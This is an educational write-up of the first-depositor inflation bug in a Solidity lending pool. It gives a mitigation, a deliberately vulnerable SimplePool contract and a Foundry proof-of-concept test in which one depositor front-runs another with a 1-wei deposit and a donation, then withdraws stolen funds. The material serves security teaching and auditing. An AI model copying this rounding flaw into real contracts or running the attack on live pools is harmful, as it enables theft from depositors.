# First deposit bug

**Name:** First deposit bug

**Description:** First pool depositor can be front-run and have part of their deposit stolen In this case, we can control the variable "_supplied." By depositing a small amount of loan tokens to obtain pool tokens,we can front-run other depositors' transactions and inflate the price of pool tokens through a substantial "donation." Consequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.

This calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1, it is essentially rounded down to 0.

**Mitigation:**

Consider minting a minimal amount of pool tokens during the first deposit and sending them to zero address, this increases the cost of the attack. Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. The same can be done in this case i.e. when totalSupply() == 0, send the first min liquidity LP tokens to the zero address to enable share dilution.

**REF:**

https://defihacklabs.substack.com/p/solidity-security-lesson-2-first

https://github.com/sherlock-audit/2023-02-surge-judging/issues/1

https://github.com/transmissions11/solmate/issues/178

**Contract:**

```jsx
contract MyToken is ERC20, Ownable {
    constructor() ERC20("MyToken", "MTK") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}

contract SimplePool {
    IERC20 public loanToken;
    uint public totalShares;

    mapping(address => uint) public balanceOf;

    constructor(address _loanToken) {
        loanToken = IERC20(_loanToken);
    }

    function deposit(uint amount) external {
        require(amount > 0, "Amount must be greater than zero");

        uint _shares;
        if (totalShares == 0) {
            _shares = amount;
        } else {
            _shares = tokenToShares(
                amount,
                loanToken.balanceOf(address(this)),
                totalShares,
                false
            );
        }

        require(
            loanToken.transferFrom(msg.sender, address(this), amount),
            "TransferFrom failed"
        );
        balanceOf[msg.sender] += _shares;
        totalShares += _shares;
    }

    function tokenToShares(
        uint _tokenAmount,
        uint _supplied,
        uint _sharesTotalSupply,
        bool roundUpCheck
    ) internal pure returns (uint) {
        if (_supplied == 0) return _tokenAmount;
        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;
        if (
            roundUpCheck &&
            shares * _supplied < _tokenAmount * _sharesTotalSupply
        ) shares++;
        return shares;
    }

    function withdraw(uint shares) external {
        require(shares > 0, "Shares must be greater than zero");
        require(balanceOf[msg.sender] >= shares, "Insufficient balance");

        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /
            totalShares;

        balanceOf[msg.sender] -= shares;
        totalShares -= shares;

        require(loanToken.transfer(msg.sender, tokenAmount), "Transfer failed");
    }
}
```

***\*How to Test:\****

forge test --contracts src/test/**first-deposit.sol**-vvvv

```jsx
// Function to test the first deposit process
    function testFirstDeposit() public {
        // Alice's address is set as the first address in the virtual machine
        address alice = vm.addr(1);
        
        // Bob's address is set as the second address in the virtual machine
        address bob = vm.addr(2);
        
        // Transfers 1 Ether plus 1 wei to Alice's account from the MyTokenContract
        MyTokenContract.transfer(alice, 1 ether + 1);
        
        // Transfers 2 Ether to Bob's account from the MyTokenContract
        MyTokenContract.transfer(bob, 2 ether);

        // Initiates a "prank" on Alice's account in the virtual machine
        vm.startPrank(alice);
        
        // Alice approves the SimplePoolContract to spend 1 wei of her tokens
        MyTokenContract.approve(address(SimplePoolContract), 1);
        
        // Alice deposits 1 wei into the SimplePoolContract, receiving 1 pool token in return
        SimplePoolContract.deposit(1);

        // Alice transfers 1 Ether to the SimplePoolContract, which inflates the price of the pool tokens
        MyTokenContract.transfer(address(SimplePoolContract), 1 ether);

        // Stops the prank on Alice's account
        vm.stopPrank();
        
        // Initiates a prank on Bob's account
        vm.startPrank(bob);
        
        // Bob approves the SimplePoolContract to spend 2 Ether of his tokens
        MyTokenContract.approve(address(SimplePoolContract), 2 ether);
        
        // Bob deposits 2 Ether into the SimplePoolContract, but due to the inflated price, he only receives 1 pool token
        SimplePoolContract.deposit(2 ether);
        
        // Stops the prank on Bob's account
        vm.stopPrank();
        
        // Initiates a prank on Alice's account
        vm.startPrank(alice);

        // Gets the balance of the SimplePoolContract in MyTokenContract
        MyTokenContract.balanceOf(address(SimplePoolContract));

        // Alice withdraws 1 pool token and gets 1.5 Ether, thus making a profit
        SimplePoolContract.withdraw(1);
        
        // Asserts that Alice's balance should now be 1.5 Ether. If it's not, it throws an error
        assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);
        
        // Logs Alice's balance in the console
        console.log("Alice balance", MyTokenContract.balanceOf(alice));
    }
```

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf5edaeb-708c-433d-b87f-9fd9a16b7633%2FUntitled.png?table=block&id=9f907b3b-45de-448e-ae5b-a3c771d9743f&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)